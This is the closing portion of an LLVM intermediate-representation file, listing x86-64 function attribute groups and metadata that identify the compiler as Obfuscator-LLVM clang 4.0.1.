attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146520450}
!2 = !{i32 -2146519322}
!3 = !{i32 -2146518631}
!4 = !{i32 -2146517882}
!5 = !{i32 -2146516943}
